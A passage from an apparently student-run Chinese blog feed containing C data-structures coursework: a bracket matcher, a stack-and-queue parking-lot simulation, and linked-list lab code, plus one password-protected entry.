class="hljs-number">50</span>);<br>S.esp=S.ebp;<br>S.size=<span class="hljs-number">50</span>;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Push</span><span class="hljs-params">(Stack &amp;S,ElemType e)</span>&#123;<br><span class="hljs-keyword">if</span>(S.esp-S.ebp==S.size)&#123;<br>S.ebp=(ElemType*)<span class="hljs-built_in">realloc</span>(S.ebp,<span class="hljs-keyword">sizeof</span>(ElemType)*(<span class="hljs-number">20</span>+S.size));<br>S.size+=<span class="hljs-number">20</span>;<br>&#125;<br>*(S.esp++)=e;<br><span class="hljs-keyword">return</span>; <br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Get</span><span class="hljs-params">(Stack S,ElemType &amp;e)</span>&#123;<br><span class="hljs-keyword">if</span>(S.esp==S.ebp)&#123;<span class="hljs-keyword">return</span>;&#125;<br>e=*(--S.esp);<br><span class="hljs-comment">//printf(&quot;Get:%c\n&quot;,e);</span><br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Pop</span><span class="hljs-params">(Stack &amp;S,ElemType &amp;e)</span>&#123;<br><span class="hljs-keyword">if</span>(S.esp==S.ebp)&#123;<br><span class="hljs-keyword">return</span>;<br>&#125;<br>e=*(--S.esp);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">Pair</span><span class="hljs-params">(<span class="hljs-type">char</span> a,<span class="hljs-type">char</span> b)</span>&#123;<br><span class="hljs-keyword">if</span>(a==<span class="hljs-string">&#x27;(&#x27;</span>)&#123;<br><span class="hljs-keyword">if</span>(b==<span class="hljs-string">&#x27;)&#x27;</span>)&#123;<span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;&#125;<br>&#125;<br><span class="hljs-keyword">if</span>(a==<span class="hljs-string">&#x27;[&#x27;</span>)&#123;<br><span class="hljs-keyword">if</span>(b==<span class="hljs-string">&#x27;]&#x27;</span>)&#123;<span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;&#125;<br>&#125;<br><span class="hljs-keyword">if</span>(a==<span class="hljs-string">&#x27;&#123;&#x27;</span>)&#123;<br><span class="hljs-keyword">if</span>(b==<span class="hljs-string">&#x27;&#125;&#x27;</span>)&#123;<span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">Match</span><span class="hljs-params">(<span class="hljs-type">char</span> a[],<span class="hljs-type">int</span> len,Stack &amp;S)</span>&#123;<br><span class="hljs-type">int</span> i;<br><span class="hljs-type">char</span> e;<br><span class="hljs-type">char</span> l1=<span class="hljs-string">&#x27;(&#x27;</span>,l2=<span class="hljs-string">&#x27;[&#x27;</span>,l3=<span class="hljs-string">&#x27;&#123;&#x27;</span>,r1=<span class="hljs-string">&#x27;)&#x27;</span>,r2=<span class="hljs-string">&#x27;]&#x27;</span>,r3=<span class="hljs-string">&#x27;&#125;&#x27;</span>;<br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;len;i++)&#123;<br><span class="hljs-keyword">if</span>(a[i]==l1||a[i]==l2||a[i]==l3)&#123;<br>Push(S,a[i]);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(a[i]==r1||a[i]==r2||a[i]==r3)&#123;<br>Get(S,e);<br><span class="hljs-keyword">if</span>(Pair(e,a[i]))&#123;<br>Pop(S,e);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span>(S.esp==S.ebp)&#123;<br><span class="hljs-comment">//printf(&quot;wtf?\n&quot;);</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-keyword">if</span>(S.ebp!=S.esp)&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>&#125;<br><span class="hljs-comment">/*int main()&#123;</span><br><span class="hljs-comment">Stack S;</span><br><span class="hljs-comment">Init(S);</span><br><span class="hljs-comment">char x;</span><br><span class="hljs-comment">Push(S,&#x27;1&#x27;);</span><br><span class="hljs-comment">Push(S,&#x27;2&#x27;);</span><br><span class="hljs-comment">Push(S,&#x27;3&#x27;);</span><br><span class="hljs-comment">Get(S,x);</span><br><span class="hljs-comment">printf(&quot;%c\n&quot;,x);</span><br><span class="hljs-comment">Pop(S,x);</span><br><span class="hljs-comment">printf(&quot;%c\n&quot;,x);</span><br><span class="hljs-comment">Pop(S,x);</span><br><span class="hljs-comment">printf(&quot;%c\n&quot;,x);</span><br><span class="hljs-comment">&#125;*/</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>Stack S;<br>Init(S);<br><span class="hljs-type">int</span> i,len;<br><span class="hljs-type">char</span> a[<span class="hljs-number">50</span>];<br>Init(S);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;输入字符串长度:\n&quot;</span>);<br><br>a1: <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;len);<br><span class="hljs-keyword">if</span>(len&gt;<span class="hljs-number">50</span>)&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入&lt;=50的数字:\n&quot;</span>);<br><span class="hljs-keyword">goto</span> a1;<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入字符:\n&quot;</span>);<br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;len;i++)&#123;<br>getchar();<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%c&quot;</span>,&amp;a[i]);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请继续输入:\n&quot;</span>,i);<br>&#125;<br><span class="hljs-keyword">if</span>(Match(a,len,S)==<span class="hljs-number">1</span>)&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;yes\n&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;no\n&quot;</span>);<br>&#125;<br><span class="hljs-comment">/*else&#123;</span><br><span class="hljs-comment">printf(&quot;no\n&quot;);</span><br><span class="hljs-comment">&#125;*/</span><br><span class="hljs-comment">/*for(i=0;i&lt;len;i++)&#123;</span><br><span class="hljs-comment">printf(&quot;%c&quot;,a[i]);</span><br><span class="hljs-comment">&#125;*/</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="问3-停车场问题"><a href="#问3-停车场问题" class="headerlink" title="问3:停车场问题"></a>问3:停车场问题</h2><p>【问题描述】<br>设停车场是一个可停放n辆汽车的狭长通道，且只有一个大门可供汽车进出。汽车在停车场内按车辆到达时间的先后顺序，依次由北向南排列（大门在最南端，最先到达的第一辆车停放在车场的最北端），若车场内已停满n辆汽车，则后来的汽车只能在门外的便道上等候，一旦有车开走，则排在便道上的第一辆车即可开入。当停车场内某辆车要离开时，在它之后进入的车辆必须先退出车场为它让路，待该辆车开出大门外，其他车辆再按原次序进入车场，每辆停放在车场的车在它离开停车场时必须按它停留的时间长短交纳费用。试为停车场编制按上述要求进行管理的模拟程序。<br>【基本要求】<br>以栈模拟停车场，以队列模拟车场外的便道，按照从终端读入的输入数据序列进行模拟管理。每一组输入数据包括三个数据项：汽车“到达”或“离去”信息、汽车牌照号码以及到达或离去的时刻。对每一组输入数据进行操作后的输出信息为：若是车辆到达，则输出汽车在停车场内或便道上的停车位置，若是车辆离去，则输出汽车在停车场内停留的时间和应交纳的费用（在便道上停留的时间不收费）。栈以顺序结构实现，队列以链表结构实现。<br>【测试数据】<br>设n&#x3D;2,输入数据为：(‘A’,1,5), (‘A’,2,10), (‘D’,1,15)，(‘A’,3,20)，(‘A’,4,25)，(‘A’,5,30)，(‘D’,2,35)，(‘D’,4,40)，(‘E’,0,0)。其中：’A’表示到达（Arrival)；’D’表示离去（Departure)；’E’表示输入结束（End)。<br>【实现提示】<br>需另设一个栈，临时停放为给要离去的汽车让路而从停车场退出来的汽车，也用顺序存储结构实现。输入数据按到达或离去的时刻有序。栈中的每个元素表示一辆汽车，包含两个数据项：汽车的牌照号码和进入停车场的时刻</p><p>草，这题咋有点超出我的能力范围</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><code class="hljs code">#include&lt;stdio.h&gt;<br>#include&lt;stdlib.h&gt;<br>#include&lt;malloc.h&gt;<br>typedef int Status;<br><br>typedef struct Car1&#123;<br>    int number;<br>    int arrive_time;<br>&#125;CarNode;<br><br>typedef struct&#123;<br>    CarNode *ebp;<br>    CarNode *esp;<br>    int stacksize;<br>&#125;Park;<br><br>typedef struct Car2&#123;<br>    int number,arrive_time;<br>    struct Car2 *next;<br>&#125;*CarPtr;<br><br>typedef struct&#123;<br>    CarPtr front;<br>    CarPtr rear;<br>    int length;<br>&#125;Shortcut;<br><br>int SInit(Park &amp;P)&#123;<br>    P.ebp=(CarNode*)malloc(5*sizeof(Car1));<br>    if(!P.ebp) exit(-2);<br>    P.esp=P.ebp;<br>    P.stacksize=0;<br>    return 1;<br>&#125;<br><br>int Push(Park &amp;P,CarNode e)&#123;<br>    *P.esp++=e;<br>    ++P.stacksize;<br>    return 1;<br>&#125;<br><br>int Pop(Park &amp;P,CarNode &amp;e)&#123;<br>    if(P.esp==P.ebp)<br>    printf(&quot;Th3 p@rk1ng lot 1s 3mpty!\n&quot;);<br>    else&#123;<br>        e=*--P.esp;<br>        P.stacksize--;<br>    &#125;<br>return 1;<br>&#125;<br><br>int InitQueue(Shortcut &amp;S)&#123;<br>    S.front=S.rear=(CarPtr)malloc(sizeof(Car2));<br>    if(!S.front||!S.rear) exit(-2);<br>    S.front-&gt;next=NULL;<br>    S.length=0;<br>    return 1;<br>&#125;<br><br>int EnQueue(Shortcut &amp;S,int number,int arrive_time)&#123;<br>    CarPtr p;<br>    p=(CarPtr)malloc(sizeof(Car2));<br>    if(!p) exit(-2);<br>    p-&gt;number=number;<br>    p-&gt;arrive_time=arrive_time;<br>    p-&gt;next=NULL;<br>    S.rear-&gt;next=p;<br>    S.rear=p;<br>    ++S.length;<br>    return 1;<br>&#125;<br><br>int DeQueue(Shortcut &amp;S,CarPtr &amp;w)&#123;<br>    if(S.length == 0)<br>    printf(&quot;Th3 s1d3w@y 1s 3mpty!\n&quot;);<br>    else&#123;<br>        w = S.front-&gt;next;<br>        S.front-&gt;next=S.front-&gt;next-&gt;next;<br>        --S.length;<br>    &#125;<br>    return 1;<br>&#125;<br><br>int Arrival(Park &amp;P,Shortcut &amp;S)&#123;<br>    int number,arrive_time;<br>    printf(&quot;请输入车牌号:&quot;);<br>    scanf(&quot;%d&quot;,&amp;number);<br>    printf(&quot;请输入进场时刻:&quot;);<br>    scanf(&quot;%d&quot;,&amp;arrive_time);<br>    if(P.stacksize&lt;5)&#123;<br>        CarNode c;<br>        c.number=number;<br>c.arrive_time=arrive_time;<br>Push(P,c);<br>printf(&quot;该车停在%d号车位.\n&quot;,P.stacksize);<br>&#125;<br>else&#123;<br>EnQueue(S,number,arrive_time);<br>printf(&quot;停车场已满,停在便道的第%d个位置.\n&quot;,S.length);<br>&#125;<br>return 1;<br>&#125;<br><br>int Leave(Park &amp;P,Park &amp;P1,Shortcut &amp;S)&#123;<br>int number,le_time,flag=1,money,arrive_time;<br>printf(&quot;请输入车牌号：&quot;);<br>scanf(&quot;%d&quot;,&amp;number);<br>printf(&quot;请输入离开时刻:&quot;);<br>scanf(&quot;%d&quot;,&amp;le_time);<br>CarNode e,m;<br>CarPtr w;<br>while(P.stacksize)&#123;<br>Pop(P,e);<br>if(e.number==number)&#123;<br>flag=0;<br>money=(le_time-e.arrive_time)*2;<br>arrive_time=e.arrive_time;<br>break;<br>&#125;<br>Push(P1,e);<br>&#125;<br>while(P1.stacksize)&#123;<br>Pop(P1,e);<br>Push(P,e);<br>&#125;<br>if (flag == 0)&#123;<br>if(S.length!=0)&#123;<br>DeQueue(S,w);<br>m.arrive_time=le_time;<br>m.number=w-&gt;number;<br>Push(P,m);<br>free(w);<br>printf(&quot;车牌号为%d的车从便道进入停车场\n&quot;,m.number);<br>&#125;<br>printf(&quot;停车费%d, 占用车位数%d\n&quot;,money,P.stacksize);<br>&#125;<br>else&#123;<br>printf(&quot;停车场不存在牌号为%d的车\n&quot;, number);<br>&#125;<br>return 1;<br>&#125;<br><br>int main()&#123;<br>int m=1;<br>char flag;<br>Park P,Q;<br>Shortcut S;<br>SInit(P);<br>SInit(Q);<br>InitQueue(S);<br>while(m)&#123;<br>printf(&quot;请选择(A(arrive),D(depature),E(end)): &quot;);<br>scanf(&quot;%c&quot;,&amp;flag);<br>switch(flag)&#123;<br>case &#x27;A&#x27;:<br>case &#x27;a&#x27;:<br>Arrival(P,S);break; <br>case &#x27;D&#x27;:<br>case &#x27;d&#x27;:<br>Leave(P,Q,S);break; <br>case &#x27;E&#x27;:<br>case &#x27;e&#x27;:<br>m=0;<br>break;<br>default:<br>printf(&quot;3rr0r!Please 1nput ag@1n\n&quot;);<br>break;<br>&#125;<br>while (flag != &#x27;\n&#x27;)<br>scanf(&quot;%c&quot;,&amp;flag);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>寄科</category>
      
      <category>编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>寄科</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>大道三千</title>
    <link href="/2021/10/05/%E5%A4%A7%E9%81%93%E4%B8%89%E5%8D%83/"/>
    <url>/2021/10/05/%E5%A4%A7%E9%81%93%E4%B8%89%E5%8D%83/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="59bd8d7bef8923b1fec91a56ab19a36540b5795f9e90a29de9d48c78ee61db3b"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">thr3e_th0u5@nd_4v3nues, 从书籍中获得的启发</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>大道三千</category>
      
    </categories>
    
    
    <tags>
      
      <tag>大道三千</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>数据结构第一次上鸡</title>
    <link href="/2021/09/26/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E9%93%BE%E8%A1%A8%E7%9A%84%E4%B8%8A%E9%B8%A1%E6%8A%A5%E5%91%8A/"/>
    <url>/2021/09/26/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E9%93%BE%E8%A1%A8%E7%9A%84%E4%B8%8A%E9%B8%A1%E6%8A%A5%E5%91%8A/</url>
    
    <content type="html"><![CDATA[<p>因为代码搓得太烂了，所以也记录一下遇到的问题吧。。大佬绕过</p><p>上鸡要求：搓个链表，然后实现增删改查、冒泡排序、约瑟夫问题、一元多项式计算</p><h2 id="代码大杂烩。。"><a href="#代码大杂烩。。" class="headerlink" title="代码大杂烩。。"></a>代码大杂烩。。</h2><h3 id="增删改查"><a href="#增删改查" class="headerlink" title="增删改查"></a>增删改查</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;malloc.h&gt;</span></span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span>&#123;</span><br><span class="hljs-type">int</span> data;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> *<span class="hljs-title">next</span>=</span><span class="hljs-literal">NULL</span>;<br>&#125;;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Init</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Node *&amp;L,<span class="hljs-type">int</span> x[],<span class="hljs-type">int</span> len)</span>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span>* <span class="hljs-title">p</span>=</span>((<span class="hljs-keyword">struct</span> Node*)(<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> Node))));<br><span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;<br>L=p;<br><span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>;i&lt;len;i++)&#123;<br>p-&gt;data=x[i];<br>p-&gt;next=((<span class="hljs-keyword">struct</span> Node*)(<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> Node))));<br>p=p-&gt;next;<br>&#125;<br>p-&gt;next=<span class="hljs-literal">NULL</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;初始化成功！\n&quot;</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Insert</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Node *&amp;L,<span class="hljs-type">int</span> num,<span class="hljs-type">int</span> d)</span>&#123;<br><span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> *<span class="hljs-title">a</span>=</span>((<span class="hljs-keyword">struct</span> Node*)(<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> Node))));<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> *<span class="hljs-title">p</span>=</span>L;<br><br><span class="hljs-keyword">while</span>(i&lt;num<span class="hljs-number">-1</span>)&#123;<br>p=p-&gt;next;<br>i++;<br>&#125;<br>a-&gt;next=p-&gt;next;<br>p-&gt;next=a;<br>a-&gt;data=d;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;插入成功！\n&quot;</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Delete</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Node *&amp;L,<span class="hljs-type">int</span> num)</span>&#123;<br><span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;<br>Node *p=L;<br><span class="hljs-keyword">if</span>(num==<span class="hljs-number">0</span>)&#123;<br>L=L-&gt;next;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-keyword">while</span>(i&lt;num<span class="hljs-number">-1</span>)&#123;<br>p=p-&gt;next;<br>i++;<br>&#125;<br>p-&gt;next=(p-&gt;next)-&gt;next;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;删除成功！\n&quot;</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Print</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Node *L)</span>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span>* <span class="hljs-title">trans</span>=</span>L;<br><span class="hljs-keyword">if</span>(trans-&gt;next==<span class="hljs-literal">NULL</span>)&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;empty list!\n&quot;</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-keyword">while</span>(trans!=<span class="hljs-literal">NULL</span>)&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,trans-&gt;data);<br>trans=trans-&gt;next;<br><span class="hljs-keyword">if</span>(trans-&gt;next==<span class="hljs-literal">NULL</span>)<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;显示完毕\n&quot;</span>); <br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> *<span class="hljs-title">L</span>;</span><br><span class="hljs-type">int</span> num=<span class="hljs-number">5</span>,data=<span class="hljs-number">12</span>;<br><span class="hljs-type">int</span> x[]=&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">0</span>&#125;; <br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;初始化：\n&quot;</span>);<br>Init(L,x,<span class="hljs-number">5</span>);<br>Print(L);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;向下标为2处插入元素12：\n&quot;</span>);<br>Insert(L,<span class="hljs-number">2</span>,data);<br>Print(L);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;依次删除元素：\n&quot;</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">-1</span>;i&lt;<span class="hljs-number">8</span>;i++)&#123;<br>Delete(L,<span class="hljs-number">0</span>);<br>Print(L);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="约瑟夫问题-损版"><a href="#约瑟夫问题-损版" class="headerlink" title="约瑟夫问题(损版)"></a>约瑟夫问题(损版)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span 